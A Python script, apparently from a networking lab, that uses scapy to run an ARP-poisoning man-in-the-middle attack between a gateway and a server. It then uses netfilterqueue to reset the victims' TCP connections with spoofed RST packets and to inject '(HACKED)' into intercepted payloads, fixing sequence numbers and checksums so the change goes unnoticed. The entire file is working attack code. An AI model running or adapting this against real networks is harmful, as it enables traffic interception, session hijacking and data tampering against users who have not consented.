from scapy.all import *
import os
import signal
import sys
import threading
import time
from netfilterqueue import NetfilterQueue
from copy import deepcopy

# Don't forget to forward packets to the queue
# iptables -I FORWARD -j NFQUEUE --queue-num 1
# When done: iptables -D FORWARD -j NFQUEUE --queue-num 1

#ARP Poison parameters
gateway_ip = "198.7.0.1"
server_ip = "198.7.0.2"
packet_count = 1000

#Broadcast ARP Request for a IP Address
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

#Keep sending false ARP replies to put our machine in the middle to intercept packets
def arp_poison(src_ip, dest_ip, dest_mac):
    print("ARP POSION ATTTACCCCK!")
    try:
        while True:
            send(ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("MERCY WAS CHOSEN, STOPPING ATTACK!")

print(f"Gateway ip: {gateway_ip}")
print(f"Server ip:  {server_ip}")

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("Could not aquire mac for gateway...")
    sys.exit(0)
else:
    print(f"Aquired gateway mac address: {gateway_mac}")

server_mac = get_mac(server_ip)
if server_mac is None:
    print("Could not aquire mac for server...")
    sys.exit(0)
else:
    print(f"Aquired server mac address: {server_mac}")

#ATTACKKKK!
fake_gateway_th = threading.Thread(target=arp_poison, args=(gateway_ip, server_ip, server_mac))
fake_server_th = threading.Thread(target=arp_poison, args=(server_ip, gateway_ip, gateway_mac))

fake_gateway_th.start()
fake_server_th.start()

captured_packets = []

first_conn = True
def process_packet_seq_spoof(pkt):
    global first_conn
    scapy_pkt = IP(pkt.get_payload())
    print(f"Src: {scapy_pkt[IP].src}, Dst: {scapy_pkt[IP].dst}")

    if scapy_pkt.haslayer(Raw) and scapy_pkt.haslayer(TCP):
        # Barge right in their conversation and reset it
        if first_conn:
            print("Barging right in")
            first_conn = False

            # Send reset to destination        
            send(IP(src=scapy_pkt[IP].src, dst=scapy_pkt[IP].dst)/
                 TCP(sport=scapy_pkt[TCP].sport, dport=scapy_pkt[TCP].dport, flags="R",
                    seq=scapy_pkt[TCP].seq, ack=scapy_pkt[TCP].ack))
            
            # Send reset to source
            send(IP(src=scapy_pkt[IP].dst, dst=scapy_pkt[IP].src)/
                 TCP(sport=scapy_pkt[TCP].dport, dport=scapy_pkt[TCP].sport, flags="R",
                    seq=scapy_pkt[TCP].ack, ack=scapy_pkt[TCP].seq + len(scapy_pkt[Raw].load)))
            
            # Drop the old packet(they will never know!!!)
            pkt.drop()
        else: # We are in, just hack the message now
            og_msg = scapy_pkt[Raw].load
            print(f"Original payload: {og_msg}")

            # Add my super original message
            my_msg = b"(HACKED)"
            new_msg = og_msg + my_msg
            
            # Change the sequence number(they will never know)
            scapy_pkt[TCP].seq -= len(my_msg)
            scapy_pkt[Raw].load = new_msg
            scapy_pkt[TCP].flags.P = True

            # Re-do checksums(thanks scappy)
            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum

            # Send the new message
            pkt.set_payload(bytes(scapy_pkt))
            pkt.accept()

            print("Hacking complete ;)")
    else:
        print(f"WEIRD PACKET: {pkt}!")
        pkt.accept()


queue = NetfilterQueue()
queue.bind(1, process_packet_seq_spoof)
try:
    queue.run()
except KeyboardInterrupt:
    print("Stopping...")
